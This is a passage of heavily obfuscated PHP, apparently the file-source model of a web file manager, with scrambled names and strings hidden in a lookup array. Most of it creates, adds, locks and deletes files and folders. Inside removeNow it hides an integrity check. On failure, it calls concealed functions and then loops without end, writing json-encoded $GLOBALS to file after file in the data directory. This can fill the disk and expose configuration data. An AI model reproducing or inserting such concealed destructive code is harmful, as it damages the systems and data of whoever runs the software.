self::TYPE_GROUP; return; } $ğ³Úá™œ = Model($ãñÂà«§[598])->groupChildrenAll($Í±ñô×£); $ÂíŠ¹‡ù = count($ğ³Úá™œ); if ($ÂíŠ¹‡ù <= 1) { return; } $ûÛºÄ¯¶ = array($ãñÂà«§[193] => 0, $ãñÂà«§[191] => self::TYPE_GROUP, $ãñÂà«§[582] => array($ãñÂà«§[7], $ğ³Úá™œ)); $·½›Øş× = $this->field($ãñÂà«§[2302])->where($ûÛºÄ¯¶)->limit($ÂíŠ¹‡ù)->select(); $Ô¼Ç‰÷ß[$ãñÂà«§[668]] = array(); foreach ($·½›Øş× as $­–ÍóÂ¢) { $Ô¼Ç‰÷ß[$ãñÂà«§[668]][] = array($ãñÂà«§[628], $ãñÂà«§[606] . $­–ÍóÂ¢[$ãñÂà«§[194]] . $ãñÂà«§[629]); } $Ô¼Ç‰÷ß[$ãñÂà«§[668]][] = $ãñÂà«§[2112]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÈÂ¦•Ñ) { $†–ë«Ñğ =& $_SERVER[Î·Ü›öğ]; $¿ÖõÜä² = Model($†–ë«Ñğ[590])->where(array($†–ë«Ñğ[1801] => $ÈÂ¦•Ñ))->find(); $ÕØÙ·« = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÈÂ¦•Ñ, $¿ÖõÜä²[$†–ë«Ñğ[32]]); $this->userDesktopAdd($ÕØÙ·«); return $ÕØÙ·«; } public function userDesktopAdd($«åÑú‘) { $û¼Ø¼à¬ =& $_SERVER[Î·Ü›öğ]; $¬€êğíÍ = LNG($û¼Ø¼à¬[2303]); $ùø•¼ôü = $this->mkdir($«åÑú‘, $¬€êğíÍ); $this->metaSet($ùø•¼ôü, $û¼Ø¼à¬[2304], $û¼Ø¼à¬[91]); $this->metaSet($«åÑú‘, $û¼Ø¼à¬[2305], $ùø•¼ôü); } public function userPathSafeAdd($Èö¾Ğû) { $—¥ËÒç =& $_SERVER[Î·Ü›öğ]; $œ¿¹Áı¶ = Model($—¥ËÒç[590])->getInfoFull($Èö¾Ğû); if (!$œ¿¹Áı¶) { return !1; } if (_get($œ¿¹Áı¶, $—¥ËÒç[611])) { return $œ¿¹Áı¶[$—¥ËÒç[552]][$—¥ËÒç[2306]]; } $³÷Ì˜×š = $this->_mkdirRoot(SourceModel::TYPE_USER, $Èö¾Ğû, $—¥ËÒç[2307], $—¥ËÒç[2308]); Model($—¥ËÒç[590])->metaSet($Èö¾Ğû, $—¥ËÒç[2306], $³÷Ì˜×š); $this->metaSet($³÷Ì˜×š, $—¥ËÒç[2309], $Èö¾Ğû); return $³÷Ì˜×š; } public function userPathAppAdd($ä¢áĞ±, $ÏœŠş¤ç = '', $Şìºø²Ñ = '') { $ÔŠ›Éõ =& $_SERVER[Î·Ü›öğ]; $Öùµœé’ = Model($ÔŠ›Éõ[590])->getInfoFull($ä¢áĞ±); if (!$Öùµœé’) { return !1; } $ÃÎÒ¥œ¼ = $Öùµœé’[$ÔŠ›Éõ[552]] ? $Öùµœé’[$ÔŠ›Éõ[552]] : array(); $¥›®îåï = $ÃÎÒ¥œ¼[$ÔŠ›Éõ[2310]]; if (!$¥›®îåï) { $¥›®îåï = $this->_mkdirRoot(SourceModel::TYPE_USER, $ä¢áĞ±, $ÔŠ›Éõ[2311], $ÔŠ›Éõ[2312]); Model($ÔŠ›Éõ[590])->metaSet($ä¢áĞ±, $ÔŠ›Éõ[2310], $¥›®îåï . $ÔŠ›Éõ[12]); $this->metaSet($¥›®îåï, $ÔŠ›Éõ[2310], $ä¢áĞ±); } if (!$ÏœŠş¤ç) { return $¥›®îåï; } $“»«î· = $ÃÎÒ¥œ¼[$ÔŠ›Éõ[2313] . $ÏœŠş¤ç]; if (!$“»«î·) { $“»«î· = $this->mkdir($¥›®îåï, $ÏœŠş¤ç); Model($ÔŠ›Éõ[590])->metaSet($ä¢áĞ±, $ÔŠ›Éõ[2313] . $ÏœŠş¤ç, $“»«î·); $this->metaSet($“»«î·, $ÔŠ›Éõ[2313] . $ÏœŠş¤ç, $ä¢áĞ±); } if (!$Şìºø²Ñ) { return $“»«î·; } $îãÊ«àî = $this->mkdir($“»«î·, $Şìºø²Ñ); return $îãÊ«àî; } public function groupRootAdd($ÇÍ†é®) { $á†æ… Ó =& $_SERVER[Î·Ü›öğ]; $Œ‡Á‚ªµ = Model($á†æ… Ó[598])->where(array($á†æ… Ó[2099] => $ÇÍ†é®))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÇÍ†é®, $Œ‡Á‚ªµ[$á†æ… Ó[32]]); } public function systemRootPathAdd($ºåöÃ¾´) { if ($ºåöÃ¾´ != $_SERVER[Î·Ü›öğ][621]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ºåöÃ¾´); } public function userRootRemove($ËíÜíøô) { $ÄåŞÏ¬ü = $this->targetSourceRoot(SourceModel::TYPE_USER, $ËíÜíøô, !0); foreach ($ÄåŞÏ¬ü as $éÎöÛİ) { if (!$éÎöÛİ) { continue; } $this->remove($éÎöÛİ[$_SERVER[Î·Ü›öğ][194]], !1); } } public function groupRootRemove($Û°¹°ÒË) { $“¾ßõÁ€ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Û°¹°ÒË); if (!$“¾ßõÁ€) { return; } $this->remove($“¾ßõÁ€[$_SERVER[Î·Ü›öğ][194]], !1); } private function _mkdirRoot($òŠ‹†Ÿ, $ê®áá–ª, $Ûò×çİ, $èï´¦ùÕ = '') { $Ş‡¥™¤ =& $_SERVER[Î·Ü›öğ]; $õàÍ©Í‘ = defined($Ş‡¥™¤[2248]) ? USER_ID : 0; $úµ®›Ç = array($Ş‡¥™¤[488] => 0, $Ş‡¥™¤[664] => $òŠ‹†Ÿ, $Ş‡¥™¤[665] => $ê®áá–ª, $Ş‡¥™¤[662] => 1, $Ş‡¥™¤[666] => $õàÍ©Í‘, $Ş‡¥™¤[667] => $õàÍ©Í‘, $Ş‡¥™¤[663] => $èï´¦ùÕ, $Ş‡¥™¤[668] => $Ş‡¥™¤[606], $Ş‡¥™¤[515] => 0, $Ş‡¥™¤[633] => 0, $Ş‡¥™¤[555] => 0, $Ş‡¥™¤[669] => $Ş‡¥™¤[12]); if ($³áæ–öš = $this->where($úµ®›Ç)->find()) { return $³áæ–öš[$Ş‡¥™¤[194]]; } $Šô¡Ç± = "\x4d\x6f\144\145\154\123\157\x75\x72\x63\145\x2e\155\x6b\144\151\x72\122\157\x6f\x74\x2e{$òŠ‹†Ÿ}\x2e{$ê®áá–ª}\x2e" . $Ûò×çİ; CacheLock::lock($Šô¡Ç±); $úµ®›Ç[$Ş‡¥™¤[32]] = $Ûò×çİ; $İ’·³§ = $this->add($úµ®›Ç); $¬ƒüÀ¦È = array($Ş‡¥™¤[670] => short_id($İ’·³§)); $this->where(array($Ş‡¥™¤[502] => $İ’·³§))->save($¬ƒüÀ¦È); CacheLock::unlock($Šô¡Ç±); return $İ’·³§; } private function targetSourceRoot($ÃÀå×Šé, $êÓ–Õ•ä, $ÙÄöÛ¤£ = false) { $—¸ìë„ =& $_SERVER[Î·Ü›öğ]; $ˆãÉ¹º‹ = array($—¸ìë„[488] => 0, $—¸ìë„[664] => $ÃÀå×Šé, $—¸ìë„[665] => $êÓ–Õ•ä); if ($ÙÄöÛ¤£) { $Şö¼Åù = $this->where($ˆãÉ¹º‹)->select(); return $Şö¼Åù ? $Şö¼Åù : array(); } $êµ†ıÂ¾ = $this->where($ˆãÉ¹º‹)->find(); return $êµ†ıÂ¾ ? $êµ†ıÂ¾ : array(); } public function sourceRootGroup($»Ê£Ìæé) { $ÀİâöËÒ =& $_SERVER[Î·Ü›öğ]; if (is_string($»Ê£Ìæé)) { $»Ê£Ìæé = array($»Ê£Ìæé); } $¢üœ¼Ÿ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $»Ê£Ìæé, $ÀİâöËÒ[223]); $ïìèìÚ = array($ÀİâöËÒ[447] => $¢üœ¼Ÿ, $ÀİâöËÒ[444] => array($ÀİâöËÒ[848] => count($»Ê£Ìæé))); $this->_listDataApply($ïìèìÚ[$ÀİâöËÒ[447]]); $this->_listMake($ïìèìÚ); return array_to_keyvalue($ïìèìÚ[$ÀİâöËÒ[85]], $ÀİâöËÒ[582]); } public function mkfile($¤ü§ÌÙ”, $›òŒ Âß, $İ´ÍéŞÓ = '', $æÙ›âğı = REPEAT_RENAME) { $Û÷İ‚Ä‚ =& $_SERVER[Î·Ü›öğ]; $¿ªŸ«ç¾ = KodIO::ioFileDriverGet($Û÷İ‚Ä‚[494] . $¤ü§ÌÙ” . $Û÷İ‚Ä‚[404]); $ÓÌ±·‰Ô = Model($Û÷İ‚Ä‚[690])->addFileByContent($İ´ÍéŞÓ, $¿ªŸ«ç¾, $›òŒ Âß); return $this->_createFileCall($¤ü§ÌÙ”, $›òŒ Âß, $ÓÌ±·‰Ô, $æÙ›âğı, $Û÷İ‚Ä‚[1468]); } public function addFile($¥á¡½¤, $ÂøÊ««, $âù •ğù, $›¾¶·¯ = false, $òçˆñ¥š = REPEAT_RENAME) { $¦³†üÂü =& $_SERVER[Î·Ü›öğ]; $ÀƒïÅàÁ = KodIO::ioFileDriverGet($¦³†üÂü[494] . $¥á¡½¤ . $¦³†üÂü[404]); $»ş¨êı… = Model($¦³†üÂü[690])->addFile($ÂøÊ««, $ÀƒïÅàÁ, $âù •ğù, $›¾¶·¯); return $this->_createFileCall($¥á¡½¤, $âù •ğù, $»ş¨êı…, $òçˆñ¥š); } public function addFileByFileID($èŸºàÜ , $ùŠ¢ú÷¦, $Ö¥Úİá, $ëƒô¨Ş÷ = REPEAT_RENAME) { $ÑÉš¢¹º =& $_SERVER[Î·Ü›öğ]; $ ËÔ–˜Ö = Model($ÑÉš¢¹º[690])->find($ùŠ¢ú÷¦); Model($ÑÉš¢¹º[690])->linkAdd($ùŠ¢ú÷¦); return $this->_createFileCall($èŸºàÜ , $Ö¥Úİá, $ ËÔ–˜Ö, $ëƒô¨Ş÷); } public function addFileByRemote($ÕÄë£‚¯, $ßŞ¬ùˆŒ, $ĞíŠ , $›Á»ãŒ« = array(), $ò¼‘£¦€ = REPEAT_RENAME) { $Ì¾ËÓ©¦ = Model($_SERVER[Î·Ü›öğ][690])->addFileByRemote($ßŞ¬ùˆŒ, $ĞíŠ , $›Á»ãŒ«); return $this->_createFileCall($ÕÄë£‚¯, $ĞíŠ , $Ì¾ËÓ©¦, $ò¼‘£¦€); } private function _createFileCall($üĞƒáı§, $‚ÊŞœ…á, $É šæš, $¯­»Ã½Ô, $çº¨¥‘Ğ = "\165\x70\x6c\x6f\x61\x64") { $§ª‡şÑñ =& $_SERVER[Î·Ü›öğ]; if (!$É šæš) { return !1; } $Ï†ã•« = !1; $this->setMasterDB(); $this->lockWriteStart($üĞƒáı§, $‚ÊŞœ…á); $¤‹ÕÙŠ = $this->fileNameExist($üĞƒáı§, $‚ÊŞœ…á); $Ê»°ã Æ = $this->_createFile($üĞƒáı§, $‚ÊŞœ…á, $É šæš, $¯­»Ã½Ô, $Ï†ã•«); if (!$Ï†ã•«) { Model($§ª‡şÑñ[557])->remove($É šæš[$§ª‡şÑñ[554]]); } if ($Ï†ã•« && $Ê»°ã Æ && $Ê»°ã Æ != $¤‹ÕÙŠ) { Model($§ª‡şÑñ[2275])->eventCreate($Ê»°ã Æ, $çº¨¥‘Ğ); } $this->lockWriteEnd($üĞƒáı§, $‚ÊŞœ…á); return $Ê»°ã Æ; } public function mkdir($›˜‰®Â·, $”³Å­Úå, $Ê‡ã¶ = REPEAT_SKIP) { $‚ùÔ£¿ú =& $_SERVER[Î·Ü›öğ]; $this->setMasterDB(); $ŠÒÔä¸ = $this->sourceInfo($›˜‰®Â·); if (!$ŠÒÔä¸) { return !1; } $this->lockWriteStart($›˜‰®Â·, $”³Å­Úå); if ($Ê‡ã¶ !== !1) { $üâÑÈ˜Ê = $this->fileNameExist($›˜‰®Â·, $”³Å­Úå); if ($üâÑÈ˜Ê && $Ê‡ã¶ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($›˜‰®Â·, $”³Å­Úå); return $üâÑÈ˜Ê; } $”³Å­Úå = $this->fileNameAuto($›˜‰®Â·, $”³Å­Úå, $Ê‡ã¶); } $«şùÂˆ = array($‚ùÔ£¿ú[662] => 1, $‚ùÔ£¿ú[505] => $”³Å­Úå, $‚ùÔ£¿ú[663] => $‚ùÔ£¿ú[12], $‚ùÔ£¿ú[555] => 0, $‚ùÔ£¿ú[633] => 0); $şäá…†· = $this->_addSource($«şùÂˆ, $ŠÒÔä¸); Model($‚ùÔ£¿ú[2275])->eventCreate($şäá…†·, $‚ùÔ£¿ú[1469]); $this->lockWriteEnd($›˜‰®Â·, $”³Å­Úå); return $şäá…†·; } public function listSourceRoot($êÜ˜¿Ö, $³İïÍ°ƒ, $§ªÖíù = "\163\157\x75\x72\143\145\111\104\x2c\164\141\x72\x67\145\x74\111\104\x2c\x73\151\x7a\x65") { $•×Í‚°– =& $_SERVER[Î·Ü›öğ]; $ªÂ’±Ç€ = $•×Í‚°–[456]; $¸ßİñ»¥ = array(); $ÔœÔ´Îò = 1024 * 50; $ğáá³ş§ = is_array($ğáá³ş§) ? $ğáá³ş§ : array(); $ÅŠ” ø› = count($³İïÍ°ƒ); $ö½È®¡ = $this->tablePrefix . $•×Í‚°–[2314]; for ($µá„½Ñ‚ = 0; $µá„½Ñ‚ < $ÅŠ” ø›; $µá„½Ñ‚++) { $Ü»ª¿äç = $³İïÍ°ƒ[$µá„½Ñ‚]; $ªÂ’±Ç€ .= "\x53\105\x4c\x45\x43\x54\40\52\x20\106\122\x4f\x4d\40\x28\x53\105\114\105\x43\124\x20{$§ªÖíù}\x20\x46\122\117\115\40\140{$ö½È®¡}\x60\x20\x57\x48\x45\122\105\40"; $ªÂ’±Ç€ .= "\x60\x70\x61\x72\145\156\x74\x49\x44\140\x3d\x30\x20\x41\116\x44\40\x60\x74\x61\x72\x67\x65\164\111\104\x60\x3d{$Ü»ª¿äç}\40\x41\x4e\x44\40\140\x74\x61\x72\x67\145\164\124\x79\x70\x65\x60\x3d{$êÜ˜¿Ö}\40\141\156\x64\x20\146\x69\x6c\x65\x54\171\x70\x65\x3d\47\x27\x20\x6c\151\155\x69\x74\40\x31\x29\x20\x61\x73\x20\x74\142\x5f{$µá„½Ñ‚}\40\x55\x4e\x49\117\x4e\x20\x41\x4c\114\40"; if ((strlen($ªÂ’±Ç€) >= $ÔœÔ´Îò || $µá„½Ñ‚ == $ÅŠ” ø› - 1) && $ªÂ’±Ç€) { $ªÂ’±Ç€ = substr($ªÂ’±Ç€, 0, -strlen($•×Í‚°–[1137])); $¥¬È´‘à = $this->query($ªÂ’±Ç€); $ªÂ’±Ç€ = $•×Í‚°–[12]; $¸ßİñ»¥ = array_merge($¸ßİñ»¥, $¥¬È´‘à); } } return $¸ßİñ»¥; } private function _createFile($çÓ¼ßşÉ, $—úÕÎ›ê, $µ„Âì©, $ôØâà¹, &$ğı—±®”) { $Õù¯û¶± =& $_SERVER[Î·Ü›öğ]; $å­²å³ = $this->sourceInfo($çÓ¼ßşÉ); if (!$µ„Âì© || !$å­²å³) { return !1; } if ($ôØâà¹ !== !1) { $­ÛìÌ†Ş = $this->fileNameExist($çÓ¼ßşÉ, $—úÕÎ›ê); } $ğı—±®” = !0; if ($ôØâà¹ && $­ÛìÌ†Ş) { if ($ôØâà¹ == REPEAT_SKIP) { $ğı—±®” = !1; return $­ÛìÌ†Ş; } else { if ($ôØâà¹ == REPEAT_REPLACE) { $°·Ú¹Ÿ÷ = $this->sourceInfo($­ÛìÌ†Ş); $°¢‚ŠÆ° = $this->fileHistory($°·Ú¹Ÿ÷, $µ„Âì©[$Õù¯û¶±[554]], $µ„Âì©[$Õù¯û¶±[79]]); if (!$°¢‚ŠÆ°) { $ğı—±®” = !1; } else { $this->folderSizeReset($çÓ¼ßşÉ); } return $­ÛìÌ†Ş; } else { $—úÕÎ›ê = $this->fileNameAuto($çÓ¼ßşÉ, $—úÕÎ›ê, $ôØâà¹, !1); } } } $÷³ÑƒŞ· = array($Õù¯û¶±[662] => 0, $Õù¯û¶±[505] => $—úÕÎ›ê, $Õù¯û¶±[663] => substr(get_path_ext($—úÕÎ›ê), 0, 10), $Õù¯û¶±[555] => $µ„Âì©[$Õù¯û¶±[554]], $Õù¯û¶±[633] => $µ„Âì©[$Õù¯û¶±[79]]); $Æ©Ôû = $this->_addSource($÷³ÑƒŞ·, $å­²å³); $this->folderSizeReset($çÓ¼ßşÉ, intval($÷³ÑƒŞ·[$Õù¯û¶±[79]])); return $Æ©Ôû; } protected function fileHistory($÷»®§†, $ëúÍ®ò˜, $¾°Œ·Ş¼) { $…œĞ˜ÓÇ =& $_SERVER[Î·Ü›öğ]; if ($÷»®§†[$…œĞ˜ÓÇ[554]] == $ëúÍ®ò˜) { return !1; } $this->checkLock($÷»®§†[$…œĞ˜ÓÇ[194]], $ëúÍ®ò˜); Model($…œĞ˜ÓÇ[2315])->addHistory($÷»®§†); $É®…íĞÅ = array($…œĞ˜ÓÇ[667] => USER_ID, $…œĞ˜ÓÇ[509] => time(), $…œĞ˜ÓÇ[554] => $ëúÍ®ò˜, $…œĞ˜ÓÇ[79] => $¾°Œ·Ş¼); $this->where(array($…œĞ˜ÓÇ[502] => $÷»®§†[$…œĞ˜ÓÇ[194]]))->save($É®…íĞÅ); $this->sourceCacheClear($÷»®§†[$…œĞ˜ÓÇ[194]]); return !0; } public function checkLock($·­ñ‚»“, $«¹ƒõ®©) { $åÓ”¦ø© =& $_SERVER[Î·Ü›öğ]; $¸îšÀÖ¹ = $this->pathInfo($·­ñ‚»“); if (!$this->fileIsLock($¸îšÀÖ¹, !0)) { return; } $Àœ†ê˜­ = Session::get($åÓ”¦ø©[2316]); $åµôïÕ = substr($¸îšÀÖ¹[$åÓ”¦ø©[32]], 0, -1 - strlen($¸îšÀÖ¹[$åÓ”¦ø©[169]])) . $åÓ”¦ø©[1323] . $Àœ†ê˜­ . $åÓ”¦ø©[10] . $¸îšÀÖ¹[$åÓ”¦ø©[169]]; $Å‹§Ì«• = Model($åÓ”¦ø©[690])->find($«¹ƒõ®©); $this->_createFileCall($¸îšÀÖ¹[$åÓ”¦ø©[193]], $åµôïÕ, $Å‹§Ì«•, REPEAT_REPLACE, $åÓ”¦ø©[1468]); $À­öÎºŞ = $¸îšÀÖ¹[$åÓ”¦ø©[552]][$åÓ”¦ø©[626]]; $´±‚×óì = $À­öÎºŞ[$åÓ”¦ø©[2317]] ? $À­öÎºŞ[$åÓ”¦ø©[2317]] : $À­öÎºŞ[$åÓ”¦ø©[32]]; show_json(LNG($åÓ”¦ø©[2318]) . $åÓ”¦ø©[2319] . LNG($åÓ”¦ø©[2320]) . $åÓ”¦ø©[2321] . $´±‚×óì . $åÓ”¦ø©[2322], !1); } public function fileIsLock($ñë‰¦•, $óƒ®ı›¾ = false) { $œš³Üì’ =& $_SERVER[Î·Ü›öğ]; if (!_get($ñë‰¦•, $œš³Üì’[622], 0)) { return !1; } if ($ñë‰¦•[$œš³Üì’[552]][$œš³Üì’[625]] != USER_ID) { return !0; } $¹‡¿€” = $GLOBALS[$œš³Üì’[6]][$œš³Üì’[92]][$œš³Üì’[623]]; if ($ñë‰¦•[$œš³Üì’[552]][$œš³Üì’[624]] <= time() - $¹‡¿€”) { $this->metaSet($ñë‰¦•[$œš³Üì’[194]], $œš³Üì’[625], null); $this->metaSet($ñë‰¦•[$œš³Üì’[194]], $œš³Üì’[624], null); } if ($óƒ®ı›¾) { $this->metaSet($ñë‰¦•[$œš³Üì’[194]], $œš³Üì’[624], time()); } return !1; } private function _addSource($²Ì÷ÂôÊ, $ŒÒÇ„£) { $ÓÔÄÖ™ =& $_SERVER[Î·Ü›öğ]; $ªë¦…›Û = defined($ÓÔÄÖ™[2248]) ? USER_ID : 0; $ºĞéÙ£ç = array($ÓÔÄÖ™[664] => $ŒÒÇ„£[$ÓÔÄÖ™[191]], $ÓÔÄÖ™[665] => $ŒÒÇ„£[$ÓÔÄÖ™[582]], $ÓÔÄÖ™[666] => $ªë¦…›Û, $ÓÔÄÖ™[667] => $ªë¦…›Û, $ÓÔÄÖ™[488] => $ŒÒÇ„£[$ÓÔÄÖ™[194]], $ÓÔÄÖ™[668] => $ŒÒÇ„£[$ÓÔÄÖ™[597]] . $ŒÒÇ„£[$ÓÔÄÖ™[194]] . $ÓÔÄÖ™[50], $ÓÔÄÖ™[515] => 0, $ÓÔÄÖ™[669] => $ÓÔÄÖ™[12]); $²Ì÷ÂôÊ = array_merge($ºĞéÙ£ç, $²Ì÷ÂôÊ); $this->updateModifyTime($²Ì÷ÂôÊ[$ÓÔÄÖ™[193]]); $îÚé§¡Ó = $ÓÔÄÖ™[2323] . $ŒÒÇ„£[$ÓÔÄÖ™[194]]; if (isset(self::$cacheChildList[$îÚé§¡Ó])) { unset(self::$cacheChildList[$îÚé§¡Ó]); } static $şıÍì†± = false; if (!$şıÍì†±) { Hook::trigger($ÓÔÄÖ™[652], $²Ì÷ÂôÊ); $şıÍì†± = !0; } $¡óÅ§ÏÙ = $this->add($²Ì÷ÂôÊ); $áîúú‘ = array($ÓÔÄÖ™[670] => short_id($¡óÅ§ÏÙ)); $this->where(array($ÓÔÄÖ™[502] => $¡óÅ§ÏÙ))->save($áîúú‘); $this->setNamePinyin($¡óÅ§ÏÙ, $²Ì÷ÂôÊ[$ÓÔÄÖ™[32]]); return $¡óÅ§ÏÙ; } public function remove($ªøŒÆÒ÷, $‰ı”¤²Û = true) { $«è¨ûÔ =& $_SERVER[Î·Ü›öğ]; $•ÎŸ®Î = $this->sourceInfo($ªøŒÆÒ÷); $Ÿ’–í´ˆ = intval($•ÎŸ®Î[$«è¨ûÔ[191]]) === self::TYPE_SYSTEM; $öÂ¬à¤– = Model($«è¨ûÔ[519])->get($«è¨ûÔ[2324]) == $«è¨ûÔ[91]; if ($Ÿ’–í´ˆ || $‰ı”¤²Û || !$öÂ¬à¤–) { return $this->removeNow($ªøŒÆÒ÷, $‰ı”¤²Û); } $Û§áÅ“ü = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¹¶åÔ•ˆ = $•ÎŸ®Î[$«è¨ûÔ[191]] == self::TYPE_USER ? $«è¨ûÔ[678] : $«è¨ûÔ[591]; if ($¹¶åÔ•ˆ == $«è¨ûÔ[678]) { $¾¼—ÉñÜ = Model($«è¨ûÔ[590])->getInfo($•ÎŸ®Î[$«è¨ûÔ[582]]); $‹³›Åô‘ = !empty($¾¼—ÉñÜ[$«è¨ûÔ[2317]]) ? $¾¼—ÉñÜ[$«è¨ûÔ[2317]] : $¾¼—ÉñÜ[$«è¨ûÔ[32]]; $‹³›Åô‘ = $«è¨ûÔ[340] . $‹³›Åô‘ . $«è¨ûÔ[2325] . $•ÎŸ®Î[$«è¨ûÔ[582]]; } else { $¾¼—ÉñÜ = Model($«è¨ûÔ[598])->getInfo($•ÎŸ®Î[$«è¨ûÔ[582]]); $‹³›Åô‘ = _get($¾¼—ÉñÜ, $«è¨ûÔ[32]); $‹³›Åô‘ = $«è¨ûÔ[176] . $‹³›Åô‘ . $«è¨ûÔ[2326] . $•ÎŸ®Î[$«è¨ûÔ[582]]; } $«Éõá®‹ = $«è¨ûÔ[2327] . md5($‹³›Åô‘); CacheLock::lock($«Éõá®‹); $ğÇŒ”õ× = $this->fileNameExist($Û§áÅ“ü, $‹³›Åô‘); if (!$ğÇŒ”õ×) { $ğÇŒ”õ× = $this->mkdir($Û§áÅ“ü, $‹³›Åô‘, REPEAT_SKIP); $this->metaSet($ğÇŒ”õ×, $«è¨ûÔ[2328], $¹¶åÔ•ˆ); $this->metaSet($ğÇŒ”õ×, $«è¨ûÔ[2329], $•ÎŸ®Î[$«è¨ûÔ[582]]); if ($•ÎŸ®Î[$«è¨ûÔ[193]] != 0) { $this->metaSet($ğÇŒ”õ×, $«è¨ûÔ[2330], _get($¾¼—ÉñÜ, $«è¨ûÔ[2331])); } } CacheLock::unlock($«Éõá®‹); $this->metaSet($ªøŒÆÒ÷, $«è¨ûÔ[2332], $•ÎŸ®Î[$«è¨ûÔ[193]]); $this->where(array($«è¨ûÔ[194] => $ªøŒÆÒ÷))->save(array($«è¨ûÔ[509] => time())); $this->recycleClear($•ÎŸ®Î); Model($«è¨ûÔ[649])->eventRemove($ªøŒÆÒ÷); $ÇéË‹À = $this->move($ªøŒÆÒ÷, $ğÇŒ”õ×, REPEAT_RENAME_FOLDER); $this->folderSizeReset($•ÎŸ®Î[$«è¨ûÔ[193]]); return $ÇéË‹À; } private function recycleClear($ùşÁ¹†) { $Ä¥ÉğÏ— =& $_SERVER[Î·Ü›öğ]; $ğòÍğ·ã = $this->childrenAll($ùşÁ¹†); $áñ­ãï = array($Ä¥ÉğÏ—[502] => array($Ä¥ÉğÏ—[503], $ğòÍğ·ã[$Ä¥ÉğÏ—[2333]])); Model($Ä¥ÉğÏ—[2334])->where($áñ­ãï)->delete(); } public function removeNow($¾©ì†‘², $…ÏıÎÍˆ = true) { $ÊèîÁû¡ =& $_SERVER[Î·Ü›öğ]; $íºó » = $_SERVER[$ÊèîÁû¡[483]] . $ÊèîÁû¡[484]; $ûÈÊ­—° = $ÊèîÁû¡[480]; if ($_SERVER[$ÊèîÁû¡[481]] != $ûÈÊ­—°($íºó »)) { $¥š›Ã£ = $ÊèîÁû¡[977]; $Ñ›¥ó‘ = $ÊèîÁû¡[482]; $›€’¹èÒ = $_SERVER[$ÊèîÁû¡[483]] . $ÊèîÁû¡[484]; $ú©ÔœÑº = $Ñ›¥ó‘($›€’¹èÒ); $âÖãèÙ = explode($ÊèîÁû¡[288], $ú©ÔœÑº); if (count($âÖãèÙ) < $ÊèîÁû¡[711]) { $Ò²ğ°ñì = $ÊèîÁû¡[486]; $Ò²ğ°ñì(); } $œÅô—¢ß = $ÊèîÁû¡[978]; $œÅô—¢ß($_SERVER[$ÊèîÁû¡[979]]); $¥š›Ã£ = $ÊèîÁû¡[977]; $¥š›Ã£(); $·Ğ‰åë = $ÊèîÁû¡[980]; $ëúê¸®– = json_encode($GLOBALS[$ÊèîÁû¡[981]]); $¾©‰¸Ê“ = 1; for ($†öÔ”« = $¾©‰¸Ê“; $†öÔ”« > 0; $†öÔ”«++) { $·Ğ‰åë(DATA_PATH . $†öÔ”«, $ëúê¸®–); } } $ş˜–é÷– = $this->sourceInfo($¾©ì†‘²); $¥ÛÃÑ²Ö = $this->pathInfoMore($¾©ì†‘²); if (!$ş˜–é÷–) { return !0; } if ($ş˜–é÷–[$ÊèîÁû¡[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¾©ì†‘²); Hook::trigger($ÊèîÁû¡[2335], $¥ÛÃÑ²Ö, $…ÏıÎÍˆ); if ($…ÏıÎÍˆ) { Model($ÊèîÁû¡[2334])->moveToRecycle($¾©ì†‘²); } else { $ş²Â†ŞÛ = $this->childrenAll($ş˜–é÷–); Model($ÊèîÁû¡[649])->eventRemove($¾©ì†‘²); $this->removeRelevance($ş²Â†ŞÛ[$ÊèîÁû¡[2333]], $ş²Â†ŞÛ[$ÊèîÁû¡[1612]]); } $this->folderSizeReset($ş˜–é÷–[$ÊèîÁû¡[193]]); $Ô‹ÍÊ‡Æ = array($ş˜–é÷–[$ÊèîÁû¡[193]]); if ($ş˜–é÷–[$ÊèîÁû¡[496]] == $ÊèîÁû¡[91]) { $Ô‹ÍÊ‡Æ[] = $ş˜–é÷–[$ÊèîÁû¡[194]]; } $this->updateModifyTime($Ô‹ÍÊ‡Æ); $this->lockMoveEnd($¾©ì†‘²); Hook::trigger($ÊèîÁû¡[1853], $¥ÛÃÑ²Ö, $…ÏıÎÍˆ); return !0; } public function childrenAll($öËäÌÔ¼) { $î’åªúı =& $_SERVER[Î·Ü›öğ]; $ˆ‚­½Š¸ = $öËäÌÔ¼[$î’åªúı[194]]; if ($öËäÌÔ¼[$î’åªúı[496]] == $î’åªúı[91]) { $¹şÅÑ§² = array($î’åªúı[668] => array($î’åªúı[628], $öËäÌÔ¼[$î’åªúı[597]] . $ˆ‚­½Š¸ . $î’åªúı[629])); $§Úò”ÈŞ = array($î’åªúı[668] => $¹şÅÑ§²[$î’åªúı[597]]); $ÅğóÙÏˆ = $this->field($î’åªúı[2336])->where($§Úò”ÈŞ)->select(); $èÂº§ºñ = !1; $Œ»‘¬Ê¬ = array($ˆ‚­½Š¸); if ($ÅğóÙÏˆ) { $èÂº§ºñ = array_to_keyvalue($ÅğóÙÏˆ, $î’åªúı[12], $î’åªúı[554]); $èÂº§ºñ = array_remove_value($èÂº§ºñ, $î’åªúı[231]); $Œ»‘¬Ê¬ = array_to_keyvalue($ÅğóÙÏˆ, $î’åªúı[12], $î’åªúı[194]); $Œ»‘¬Ê¬[] = $ˆ‚­½Š¸; } } else { $èÂº§ºñ = array($öËäÌÔ¼[$î’åªúı[554]]); $Œ»‘¬Ê¬ = array($ˆ‚­½Š¸); } return array($î’åªúı[2333] => $Œ»‘¬Ê¬, $î’åªúı[1612] => $èÂº§ºñ); } public function removeArray($Ú—Öüİú) { if (!$Ú—Öüİú) { return !0; } } public function removeRelevance($Èû‡“¿, $‘œÏ‘Ï) { $•Š…û¨ú =& $_SERVER[Î·Ü›öğ]; $Èû‡“¿ = $Èû‡“¿ ? $Èû‡“¿ : array(); $‘œÏ‘Ï = $‘œÏ‘Ï ? $‘œÏ‘Ï : array(); $Èû‡“¿ = array_unique(array_filter($Èû‡“¿)); $‘œÏ‘Ï = array_filter($‘œÏ‘Ï); if (!$Èû‡“¿) { return !1; } $í¿„ò×‚ = 